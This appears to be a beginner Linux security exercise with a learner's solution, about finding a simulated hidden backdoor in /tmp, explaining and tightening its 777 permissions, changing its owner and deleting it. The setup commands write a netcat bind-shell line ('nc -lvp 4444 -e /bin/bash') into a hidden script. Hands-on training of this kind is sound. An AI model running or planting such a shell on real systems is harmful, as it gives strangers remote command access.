**Scenario:** An attacker created a hidden backdoor on your system. Find it.

**Setup (run these commands first to simulate the attack):**

``` bash
mkdir -p /tmp/.hidden_backdoor

touch /tmp/.hidden_backdoor/.payload.sh

echo "#!/bin/bash" > /tmp/.hidden_backdoor/.payload.sh

echo "nc -lvp 4444 -e /bin/bash" >> /tmp/.hidden_backdoor/.payload.sh

chmod 777 /tmp/.hidden_backdoor/.payload.sh
```

**Your mission:**

1. Navigate to `/tmp` and list ALL files including hidden ones
2. Find the hidden directory (hint: it starts with `.`)
3. Read the contents of the hidden payload file
4. What do the permissions `777` on this file mean? Why is this dangerous?
5. Fix the permissions to `700` so only root can use it
6. Change the owner to `root` so your user can't touch it
7. Delete the entire backdoor directory


### Solution
1. First, I ran the setup commands to make a fake backdoor so that we can practice easily.
2. I navigated to the `/tmp` directory and ran the `ls -a` command which will list all the files including hidden ones.
3. After a bit of searching, I found that files and directories starting from `.` are hidden from the standard `ls` command like `.backdoor, .file.txt` etc. The hidden directory was `.hidden_backdoor`
4. I ran the `ls -a` on the hidden directory and found a hidden file `.payload.sh`. I read its content through `cat` and it was successful.
5. On running `ls -l .payload.sh`, I found it has `777` permissions. It's dangerous because the file is world-writeable. Attackers can write and execute malicious commands from here.
6. I ran `chmod 700 .payload.sh` to fix its permissions to owner-writeable only.
7. I changed the user to `root` through `sudo chown root .payload.sh` so that other users cannot touch it.
8. As the directory is a simulated backdoor, and it is not empty, it will not be deleted by the `rmdir`, so force delete it by `rm -rf .hidden_backdoor`